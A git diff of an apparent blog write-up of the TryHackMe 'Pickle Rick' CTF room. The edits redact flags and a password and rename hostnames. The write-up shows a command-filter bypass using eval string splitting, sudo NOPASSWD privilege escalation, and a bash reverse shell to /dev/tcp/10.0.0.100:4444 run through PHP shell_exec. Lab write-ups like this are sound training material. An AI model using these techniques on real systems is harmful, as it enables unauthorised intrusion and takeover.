@@ -7,7 +7,7 @@ categories: tryhackme writeup
 ---
 ![Pickle Rick Banner](/assets/img/20211230211943.png)
 
-Pickle Rick was a fun Rick and Morty themed CTF box. As you make your way through the system, you collect text files containing ingredients to turn Rick back into a human. There are three files; two of which are accessible to the www-data user. To read the third file, you must be root. You can gain initial access just by following a typical web enumeration methodology. Once inside the admin portal, there's a built-in web shell with some rudimentary restrictions that can be easily bypassed. Getting a shell is trivial and then the www-data user has NOPASSWD sudo privileges for instant root access.
+[Pickle Rick](https://tryhackme.com/room/picklerick) was a fun Rick and Morty themed CTF box from [TryHackMe](https://tryhackme.com). As you make your way through the system, you collect text files containing ingredients to turn Rick back into a human. There are three files; two of which are accessible to the www-data user. To read the third file, you must be root. You can gain initial access just by following a typical web enumeration methodology. Once inside the admin portal, there's a built-in web shell with some rudimentary restrictions that can be easily bypassed. Getting a shell is trivial and then the www-data user has NOPASSWD sudo privileges for instant root access.
 
 ## Initial Enumeration
 I started my enumeration with a quick port scan.
@@ -114,7 +114,7 @@ Of course! I totally forgot to check _robots.txt_.
 
 robots.txt
 ```text
-Wubbalubbadubdub
+REDACTED
 ```
 
 Well, that doesn't give us anything new to look at. Okay, let's try Nikto.
@@ -151,7 +151,7 @@ And there's my mistake. I wasn't running feroxbuster with any file extensions. N
 
 ## Admin Portal Access
 
-We probably have a valid username (found in the HTML source), but no password. As I was preparing to mount a brute force attack, I took a mental inventory of obscure information I'd come across so far. What about the odd content I found in _robots.txt_? Let's try it: `R1ckRul3s:Wubbalubbadubdub`
+We probably have a valid username (found in the HTML source), but no password. As I was preparing to mount a brute force attack, I took a mental inventory of obscure information I'd come across so far. What about the odd content I found in _robots.txt_? Let's try it: `R1ckRul3s:REDACTED`
 
 ![](/assets/img/20211228224327.png)
 
@@ -192,7 +192,7 @@ drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
 Looks like we found our first ingredient. Let's cat the file using the obfuscation method used earlier (`var1="c"; var2="at"; eval "$var1$var2 /var/www/html/Sup3rS3cretPickl3Ingred.txt"`).
 
 ```text
-mr. meeseek hair
+REDACTED
 ```
 
 Maybe the clue file will help us with the next ingredient (`var1="c"; var2="at"; eval "$var1$var2 /var/www/html/clue.txt"`).
@@ -229,27 +229,27 @@ www-data@picklerick:/var/www/html$
 It's now much easier to move around the system and we quickly find there's a home directory for rick with the second ingredient.
 
 ```console
-www-data@ip-10-10-248-34:/var/www/html$ cd /home
+www-data@picklerick:/var/www/html$ cd /home
 cd /home
-www-data@ip-10-10-248-34:/home$ ls -al
+www-data@picklerick:/home$ ls -al
 ls -al
 total 16
 drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
 drwxr-xr-x 23 root   root   4096 Dec 31 00:44 ..
 drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
 drwxr-xr-x  4 ubuntu ubuntu 4096 Dec 31 02:51 ubuntu
-www-data@ip-10-10-248-34:/home$ cd rick
-cld rick
-www-data@ip-10-10-248-34:/home/rick$ s -al
+www-data@picklerick:/home$ cd rick
+cd rick
+www-data@picklerick:/home/rick$ ls -al
 ls -al
 total 12
 drwxrwxrwx 2 root root 4096 Feb 10  2019 .
 drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
 -rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
-www-data@ip-10-10-248-34:/home/rick$ cat second\ ingredients
+www-data@picklerick:/home/rick$ cat second\ ingredients
 cat second\ ingredients
-1 jerry tear
-www-data@ip-10-10-248-34:/home/rick$ 
+REDACTED
+www-data@picklerick:/home/rick$ 
 ```
 
 ## Privilege Escalation
@@ -257,21 +257,21 @@ www-data@ip-10-10-248-34:/home/rick$
 Finally, we need root access to get the third ingredient. Let's start by checking sudo privileges.
 
 ```console
-www-data@ip-10-10-248-34:/home/rick$ sudo -l
+www-data@picklerick:/home/rick$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on
-    ip-10-10-248-34.eu-west-1.compute.internal:
+    picklerick.eu-west-1.compute.internal:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on
-        ip-10-10-248-34.eu-west-1.compute.internal:
+        picklerick.eu-west-1.compute.internal:
     (ALL) NOPASSWD: ALL
-www-data@ip-10-10-248-34:/home/rick$ 
+www-data@picklerick:/home/rick$ 
 ```
 
 ```console
-www-data@ip-10-10-248-34:/home/rick$ sudo su -
+www-data@picklerick:/home/rick$ sudo su -
 sudo su -
 mesg: ttyname failed: Inappropriate ioctl for device
 whoami
@@ -286,7 +286,7 @@ drwxr-xr-x 23 root root 4096 Dec 31 00:44 ..
 drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
 drwx------  2 root root 4096 Feb 10  2019 .ssh
 cat 3rd.txt
-3rd ingredients: fleeb juice
+REDACTED
 ```
 
 That's all three ingredients! Keep reading if you're curious why you have to double your bash command to get a proper reverse shell.
@@ -303,10 +303,10 @@ I'd just get an empty response. An empty response made some sense: PHP wasn't ca
 I started an interactive PHP session and emulated this functionality.
 
 ```console
-ubuntu@ip-10-10-248-34:~$ php -a
+ubuntu@picklerick:~$ php -a
 Interactive mode enabled
 
-php > echo(shell_exec("bash -i >& /dev/tcp/10.6.125.202/4444 0>&1"));
+php > echo(shell_exec("bash -i >& /dev/tcp/10.0.0.100/4444 0>&1"));
 sh: 1: Syntax error: Bad fd number
 php > 
 ```
